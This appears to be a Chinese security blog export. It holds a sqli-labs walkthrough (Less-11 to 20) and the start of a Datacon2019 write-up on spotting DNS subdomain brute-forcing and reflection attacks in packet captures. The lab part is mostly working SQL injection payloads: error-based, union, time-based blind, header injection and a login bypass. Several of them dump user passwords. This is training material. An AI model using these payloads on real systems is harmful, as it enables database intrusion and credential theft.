<h3 id="Less-11-基于错误的POST型单引号字符型注入">Less-11 基于错误的POST型单引号字符型注入</h3>
<p>测试登录成功，有数据库的数据回显信息，那么就可以尝试使用联合查询注入：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019132444.png" alt=""></p>
<p>再使用<code>admin'</code>判断注入点：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019133259.png" alt=""></p>
<blockquote>
<p>这里我们使用burpsuite抓包，发送到<code>repeater</code>模块修改POST参数。</p>
</blockquote>
<h4 id="方法一-单引号报错注入">方法一 单引号报错注入</h4>
<h5 id="爆库payload-v3">爆库payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1,concat(0x7e,(select database()))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<h5 id=""><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81agywyfyj217y0nm49d.jpg" alt=""></h5>
<h5 id="爆表payload-v3">爆表payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81an6fblvj217y0nm79y.jpg" alt=""></p>
<h5 id="爆列名payload-v2">爆列名payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81ardx08vj217y0nmn2w.jpg" alt=""></p>
<h5 id="爆值payload-v2">爆值payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and extractvalue(1, concat(0x7e, (select group_concat(username, 0x3a, password) from users))) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g81awfdnq0j217y0nmjx0.jpg" alt=""></p>
<blockquote>
<p>记录值获取个数有限</p>
</blockquote>
<h4 id="方法二-使用联合查询">方法二 使用联合查询</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;0&#39; union select 1,2 --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意<code>uname</code>值是错误的时候，才能正确显示联合查询的内容</p>
</blockquote>
<p>举一个🌰：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;0&#39; union select 1,database() --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p>其他的payload类似。</p>
<h3 id="Less-12-基于错误的POST型双引号字符型变形注入">Less-12 基于错误的POST型双引号字符型变形注入</h3>
<h4 id="方法一-双引号报错注入">方法一 双引号报错注入</h4>
<p>按照题意把Less-11中payload的单引号改为双引号应该就能注入，但是在实际操作中，发现无论是用<code>--+</code>还是<code>#</code>还是<code>0x23</code>都不能注释掉后面的内容。</p>
<p>查看一下PHP文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$uname = <span class="string">&#x27;&quot;&#x27;</span>+$uname+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$passwd = <span class="string">&#x27;&quot;&#x27;</span>+$passwd+<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">@$sql = <span class="string">&quot;SELECT username, password from users where username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) limit 0,1&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>构造一个能闭合而且报错的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所以SQL查询语句就变成了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select username, password from users where username&#x3D;&quot;admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot;&quot; and password&#x3D;($passwd) limit 0,1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还是在Burpsuite的repeater模块中修改POST参数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019121640.png" alt=""></p>
<h5 id="爆库payload-v4">爆库payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="爆表payload-v4">爆表payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019122304.png" alt=""></p>
<h5 id="爆列名payload-v3">爆列名payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019122549.png" alt=""></p>
<h5 id="爆值payload-v3">爆值payload</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1, concat(0x7e, (select group_concat(username, &#39;::&#39;, password) from users))) and &quot; &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019124108.png" alt=""></p>
<h4 id="方法二-使用联合查询-v2">方法二 使用联合查询</h4>
<p>根据SQL查询语句可以构造一个联合查询注入的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin5&quot;) union select 1,database() --+ &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>其他的payload替换查询语句即可。</p>
<h3 id="Less-13-POST单引号变形双注入">Less-13 POST单引号变形双注入</h3>
<p>当输入正确信息时发现没有回显信息，所以不能用联合查询，但可以使用时间盲注。</p>
<p>使用<code>admin' and 1=1</code>判断注入点：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019140947.png" alt=""></p>
<p>通过报错信息可以知道需要一个<code>)</code>来闭合查询语句，在尝试<code>admin') and 1=1 and ('</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019141948.png" alt=""></p>
<p>可以发现数据库不报错，SQL语句可以正常执行。由此，我们可以使用报错注入。</p>
<h4 id="方法一-报错注入">方法一 报错注入</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;) and extractvalue(1, concat(0x7e, (select database()))) and (&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在concat()中构造查询语句，和less-12以及之前的报错型注入一样，不再赘述。</p>
<h4 id="方法二-时间盲注">方法二 时间盲注</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39;) and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),1) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Less-14-POST单引号双注入">Less-14 POST单引号双注入</h3>
<p>先尝试使用<code>admin&quot;) and 1=1 (&quot;</code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019143648.png" alt=""></p>
<p>通过报错信息可以看出， 输入内容被放到双引号中 ，再次尝试`admin&quot; and 1=1#：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019144616.png" alt=""></p>
<p>而使用<code>admin&quot; and 1=2#</code>发现登录失败。</p>
<h4 id="方法一-报错注入-v2">方法一 报错注入</h4>
<p>使用<code>extracvalue</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and extractvalue(1,concat(0x7e,(select database()))) # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用<code>floor</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D; &quot; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a # &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="方法二-时间盲注-v2">方法二 时间盲注</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&quot; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(3),1) --+ &amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Less-15-基于布尔型或时间延迟单引号POST型注入">Less-15 基于布尔型或时间延迟单引号POST型注入</h3>
<p>无论怎么输入都没有回显—&gt;时间延迟注入。</p>
<p>延迟测试payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and sleep(5) --+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>页面延迟明显，确定使用时间盲注：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and if(length(database())&#x3D;8,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&#39; and if(left(database(),1)&#x3D;&#39;s&#39;,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line">uname&#x3D;admin&#39; and if( left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;&#39;r&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"> </span><br><span class="line">uname&#x3D;admin&#39; and if(left((select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 4,1),8)&#x3D;&#39;password&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line">uname&#x3D;admin&#39; and if(left((select password from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"> </span><br><span class="line">uname&#x3D;admin&#39; and if(left((select username from users order by id limit 0,1),4)&#x3D;&#39;dumb&#39; ,sleep(5),1)--+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Less-16-基于布尔型或时间延迟的双引号POST型盲注">Less-16 基于布尔型或时间延迟的双引号POST型盲注</h3>
<p>把Less-15的单引号改成双引号即可。</p>
<blockquote>
<p>另外还可以使用 万能账号绕过密码验证<code>admin&quot;)# </code>验证。</p>
</blockquote>
<h3 id="Less-17-基于错误的更新查询POST注入">Less-17 基于错误的更新查询POST注入</h3>
<p>无论怎么输入也没有错误回显，查阅<code>index.php</code>源码可以看到<code>check_input</code>函数对参数<code>uname</code>进行的处理，仔细一下这个函数的源码：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019162506.png" alt=""></p>
<p>第一步，只截取前15个字符；</p>
<p>第二步，首先介绍<code>get_magic_quotes_gpc()</code>函数的作用：</p>
<ul>
<li>
<p>当magic_quotes_gpc=On的时候，函数get_magic_quotes_gpc()就会返回1</p>
</li>
<li>
<p>当magic_quotes_gpc=Off的时候，函数get_magic_quotes_gpc()就会返回0</p>
</li>
</ul>
<p><code>get_magic_quotes_gpc()</code>函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的误。</p>
<p>也就是说，在magic_quotes_gpc = On的情况下，如果输入的数据有单引号<code>'</code>、双引号<code>&quot;</code>、反斜线<code>\</code>与 <code>NULL</code>等字符都会被加上反斜线。</p>
<p>第三步，<code>stripslashes()</code>函数删除反斜线；</p>
<p>第四步，<code>ctype_digit()</code>函数 判断是否是数字，是数字就返回true，否则返回false；</p>
<p>第五步，<code> intval()</code>整型转换。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191019210958.png" alt=""></p>
<p>对<code>username</code>搞了这么多花里胡哨的操作，但是<code>password</code>字段还是光秃秃的，使用<code>updatexml()</code>函数对<code>password</code>字段进行注入。</p>
<h4 id="爆库payload-v5">爆库payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, database(), 0x7e),1)--+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020105155.png" alt=""></p>
<h4 id="爆表名payload">爆表名payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020105523.png" alt=""></p>
<h4 id="爆列名payload-v4">爆列名payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="爆值payload-v4">爆值payload</h4>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>发现有报错：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You can&#39;t specify target table &#39;tablename&#39; for update in FROM clause</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这是因为在MySQL里，不能先<code>SELECT</code>一个表的记录，在按此条件进行更新和删除同一个表的记录。网上的解决办法是，将<code>SELECT</code>得到的结果，再通过中间表<code>SELECT</code>一遍，即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select password from (select group_concat(password) from users)),0x7e),1) --+ &amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是又出现了新的错误信息：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020110846.png" alt=""></p>
<p>在做<strong>多表查询</strong>，或者查询的时候<strong>产生新的表</strong>的时候会出现这个错误：Every derived table must have its own alias（<strong>每一个派生出来的表都必须有一个自己的别名</strong>）。</p>
<p>最终payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;admin&#39; and updatexml(1,concat(0x7e,(select password from (select password from users limit 0,1) as test),0x7e),1) --+&amp;submit&#x3D;Submit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020111440.png" alt=""></p>
<h3 id="Less-18-基于错误的Uagent头部字段POST注入">Less-18 基于错误的Uagent头部字段POST注入</h3>
<p>如果登录正常的话，会显示UserAgent字段的信息：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020124947.png" alt=""></p>
<p>抓包修改user-agent为一下payload就可以了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020135010.png" alt=""></p>
<p>其他的payload类似。</p>
<h3 id="Less-19-基于错误的Reference头部字段POST注入">Less-19 基于错误的Reference头部字段POST注入</h3>
<p>本题和上一题很像，回显是referer，查一下php文件可以发现，insert语句中向数据库插入了referer，所以注入点改为referer，paylaod和上一题完全一样，也可以参照less-12，将其双引号改为单引号作为本题payload，不再赘述。</p>
<h3 id="Less-20-基于错误的Cookie头部字段POST注入">Less-20 基于错误的Cookie头部字段POST注入</h3>
<p>登录成功后的页面：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020140033.png" alt=""></p>
<p>再查看一下PHP文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020143926.png" alt=""></p>
<p>用Burpsuite抓包改参数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020144147.png" alt=""></p>
<p>发现有数据库错误回显，构造payload：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020145928.png" alt=""></p>
<p>另外还可以使用联合查询，首先判断列数：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020150201.png" alt=""></p>
<p>再来构造一个样例payload：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191020150343.png" alt=""></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Datacon2019-q1-Writeup-v1</title>
    <url>/Web_security/ctf_writeup/1.Datacon2019-q1-Writeup-v1/</url>
    <content><![CDATA[<h1 id="Datacon2019-q1-Writeup-v1">Datacon2019-q1-Writeup-v1</h1>
<p>这是我写的第一篇博文。</p>
<p>过几个月就要去读研了，暑假期间导师给了我们一个小小的任务：复现2019 Datacon比赛的第一题。之前从来没有接触过流量分析相关的工作，也算是一个全新的开始，在此记录一下别人的思路和复现的过程。</p>
<h2 id="题目说明">题目说明</h2>
<h3 id="题目背景">题目背景</h3>
<p>假如你是某网络的管理员，近日接到告警称，网络中存在 DNS 攻击行为，希望你进行调查。现捕获到网络中的 DNS 流量，请对其中的攻击行为进行分析。</p>
<h3 id="题目要点">题目要点</h3>
<p>DNS是互联网中重要的基础设施之一，对网络的稳定运行有至关重要的作用。然而，由于设计缺陷，DNS 存在诸多脆弱点，因此可被利用与诸多攻击。本题对常见的 DNS 安全问题进行考察。</p>
<h2 id="知识储备">知识储备</h2>
<h3 id="DNS协议及报文格式">DNS协议及报文格式</h3>
<p>这篇<a href="https://jocent.me/2017/06/18/dns-protocol-principle.html#_label2">文章</a>对于DNS讲的还比较透彻，在此基础做一点摘要。</p>
<ul>
<li>
<p>域名层次结构<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4r8j4pn8xj20tm0ar74y.jpg" alt="域名层次"></p>
</li>
<li>
<p>域名服务器<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4r8nxtahtj20qt09zaap.jpg" alt="域名服务器"><br>
另外还有一个本地域名服务器：当一个主机发出DNS查询请求的时候，这个查询请求首先就是发给本地域名服务器的。</p>
</li>
<li>
<p>域名解析过程</p>
<p>以查询<code>jocent.me</code>为例，其中10.74.36.90为主机IP，10.74.1.11为本地DNS服务器：<br/><br>
①主机10.74.36.90先向本地域名服务器10.74.1.11进行递归查询<br/><br>
②本地域名服务器采用迭代查询，向一个根域名服务器进行查询<br/><br>
③根域名服务器告诉本地域名服务器，下一次应该查询的顶级域名服务器<code>dns.me</code>的IP地址<br/><br>
④本地域名服务器向顶级域名服务器<code>dns.me</code>进行查询<br/><br>
⑤顶级域名服务器me告诉本地域名服务器，下一步查询权限服务器<code>dns.jocent.me</code>的IP地址<br/><br>
⑥本地域名服务器向权限服务器<code>dns.jocent.me</code>进行查询<br/><br>
⑦权限服务器<code>dns.jocent.me</code>告诉本地域名服务器所查询的主机的IP地址<br/><br>
⑧本地域名服务器最后把查询结果告诉 10.74.36.90<br/><br>
其中有两个概念递归查询和迭代查询:<br>
<strong>递归查询</strong>：本机向本地域名服务器发出一次查询请求，就静待最终的结果。如果本地域名服务器无法解析，自己会以DNS客户机的身份向其它域名服务器查询，直到得到最终的IP地址告诉本机。<br/><br>
<strong>迭代查询</strong>：本地域名服务器向根域名服务器查询，根域名服务器告诉它下一步到哪里去查询，然后它再去查，每次它都是以客户机的身份去各个服务器查询。</p>
</li>
<li>
<p>报文格式<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4r98y58kmj20ob0bc3z6.jpg" alt="DNS协议报文格式"></p>
</li>
</ul>
<h3 id="a-id-ANY-DNS资源记录ANY类型"><a id='ANY'> <strong>DNS资源记录ANY类型</strong></h3>
<p>为什么在DDOS方法攻击的时候需要指定ANY类型参数，我们使用dig命令来看一下具体情况：<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4sps2a7apj20tm0i1q8t.jpg" alt=""><br>
可以看到，DNS服务器返回了该服务器中所有关于<code>163.com</code>的资源记录，包括类型A，NS，MX，TXT，这样就使得响应数据包远远大于请求数据包。<br>
我们不妨再往深层次想一想，已知UDP数据包的最大长度是512字节，也就是说当DNS响应数据大于512字节的时候，数据只返回512字节，剩余的数据将被丢弃。为什么在这个地方DNS的响应数据可以返回大于2000字节的数据呢？可以去查看请求数据包中的Additional Records有一条OPT类型的资源记录，OPT类型是一种一个“伪 DNS记录类型”以支持 EDNS协议，其中<code>UDP Payload Size</code>字段可以指定DNS返回报文的最大长度。<a href="http://blog.hnxiezan.com/blog/post/1/">这里</a>对EDNS有比较详细的解释。</p>
<h3 id="DNS攻击类型">DNS攻击类型</h3>
<p><a href="https://securitytrails.com/blog/most-popular-types-dns-attacks">这里</a>有对DNS的各种攻击类型的介绍。</p>
<h3 id="dns-flags-opt常见的值"><code>dns.flags.opt</code><strong>常见的值</strong></h3>
<ul>
<li>dns.flags.opcode=0(只显示DNS常规查询消息，以及相应的DNS响应消息)</li>
<li>dns.flags.opcode=1(只显示DNS逆向查询消息，以及相应的DNS响应消息)</li>
<li>dns.flags.opcode=2(只显示DNS服务器状态请求查询消息，以及相应的DNS服务器状态响应消息)</li>
<li>dns.flags.opcode=5(只显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息）</li>
</ul>
<h3 id="DNS资源记录（RR）类型——NS和SOA">DNS资源记录（RR）类型——NS和SOA</h3>
<p><a href="https://www.cnblogs.com/comefuture/p/7543752.html">NS和SOA的区别</a></p>
<p><strong>SOA</strong>，即Start Of Authority，放在 zone file 中，用于描述这个 zone 负责的 name server，version number…等资料，以及当 slave server 要备份这个 zone 时的一些参数。每个 zone file 中必须有且仅有一条 SOARR ，并在 zone file 中作为第一条资源记录保存。</p>
<h3 id="DNS资源记录（RR）类型——AXFR和IXFR">DNS资源记录（RR）类型——AXFR和IXFR</h3>
<p>AXFR（完全区域传输 252）：由主域名服务器转移整个区域文件至辅助域名服务器。</p>
<p>IXFR（增量区域传输 251）：请求只有与先前流水式编号不同的特定区域的区域转移。此请求有机会被拒绝，如果权威服务器由于配置或缺乏必要的数据而无法履行请求，一个完整的（AXFR）会被发送以作回应。</p>
<p><a href="https://www.cnblogs.com/cyjaysun/p/4265240.html">详细介绍</a></p>
<h3 id="DNSSEC协议">DNSSEC协议</h3>
<p><a href="https://bbs.huaweicloud.com/blogs/1f0fba3f514e11e9bd5a7ca23e93a891">浅谈DNS域名安全扩展协议DNSSEC</a></p>
<h2 id="解题过程">解题过程</h2>
<h3 id="子域名爆破攻击">子域名爆破攻击</h3>
<ul>
<li>
<p>攻击原理</p>
<p>链接](<a href="https://www.secpulse.com/archives/55823.html">https://www.secpulse.com/archives/55823.html</a>)</p>
</li>
<li>
<p>发现过程<br>
首先，用 Wireshark 打开 pcap 包，绘制 IO Graphs：<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rdg2cpa3j211g0b1jun.jpg" alt=""><br>
可见，在 5500 - 6000s 中出现了异常的峰值流量，将5500s到6000s所有请求、响应提取到新的 pcap文件。</p>
<p>接下来使用 协议分级 查看哪些协议占比最多：<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rdzspy3ej20us05u0tm.jpg" alt=""><br>
可以看到，切出来的包里面仅有DNS协议，而且用户主动发送的数据包占比最大。<br>
查看分组长度<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rer19tc2j20m7081gmo.jpg" alt=""><br/><br>
<strong>长度为1280~2559字节的数据包通常表示数据传输，长度较小的数据包则表示协议控制序列</strong></p>
<p>以请求数量从高到低的 IP 地址进行排序。<br>
<strong>方法一(速度很慢)：</strong><br>
使用wireshark的统计功能，并且用<code>dns.flags.response == 0</code>进行筛选(只看DNS查询报文)：<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rfgmc1aoj20mb0ckmz3.jpg" alt=""><br/><br>
<strong>方法二：</strong></p>
<p>使用tshark命令行进行筛选<code>tshark -r timeTop.pcap -T fields -e ip.src -e ip.dst | tr &quot;\t&quot; &quot;\n&quot; | sort | uniq -c | sort -nr &gt; ipRank.txt</code></p>
<p>参数解释：</p>
<p>-r 指定目标文件</p>
<p>-Y 指定过滤规则</p>
<p>-T pdml|ps|text|fields|psml,设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text</p>
<p>-e  如果-T fields选项指定，-e用来指定输出哪些字段</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rfi2f16nj20p00gsjsm.jpg" alt=""><br>
首先查看第一个IP 45.80.170.1：<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rlk5wk9bj211k09iaci.jpg" alt=""><br>
可以看到这个IP地址是一个DNS服务。<br>
再来查看第二个IP 144.202.64.226：<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rlqt02paj211i0e5n0s.jpg" alt=""><br>
144.202.64.226 发起了大量针对<code>b0e.com.cn</code>域名的查询请求，且大部分相应结果均为 No such name，因此判断此类攻击为子域名爆破攻击。<br>
通过观察，可以发现，前 10 个请求并不是域名爆破攻击，去掉该 10 个请求后，第一类攻击共有 34184 个。</p>
</li>
</ul>
<h3 id="DDOS反射放大攻击">DDOS反射放大攻击</h3>
<ul>
<li>
<p>攻击原理<br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rm7yrtvbj20970adwek.jpg" alt=""></p>
<ul>
<li>流量放大：利用回复包比请求包大的特点</li>
<li>地址伪造：伪造请求包的源地址为攻击目标</li>
<li>分布式：多个 DNS 同时向攻击目标返回大量响应</li>
</ul>
</li>
<li>
<p>攻击特征</p>
<ul>
<li>通过递归查询从而放大流量，因此recursion=1，ANY参数（<a href="#ANY">为什么必须是ANY参数</a>）。</li>
<li>要求返回包远远大于发送包，一般返回包的要求大于3000。即dns.rr.udp_payload_size&gt;=3000。</li>
</ul>
</li>
<li>
<p>发现过程<br>
通过攻击特征可以得出筛选条件<code>dns.flags.response == 0 &amp;&amp; dns.flags.recdesired == 1 &amp;&amp; dns.qry.type == 255 &amp;&amp; dns.rr.udp_payload_size &gt;= 3000</code>，再对筛选后的IP地址进行统计：<code>tshark -r q1_final.pcap -Y &quot;dns.flags.recdesired==1 &amp;&amp; dns.flags.response==0 &amp;&amp; dns.rr.udp_payload_size&gt;=3000 &amp;&amp; dns.qry.type==255&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c| sort -nr|more</code><br>
<img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4v0zdtr9lj20u4092113.jpg" alt=""><br>
这样就过滤出了 DNS 服务响应数据了，一共有188.141.167.218，187.199.129.12，70.85.232.160，45.80.170.1四个DNS服务器，接着排除不支持 <strong>ANY</strong> 的 DNS 服务器，也就是 Refused：</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4v2thmc2lj20rm0a2acr.jpg" alt=""></p>
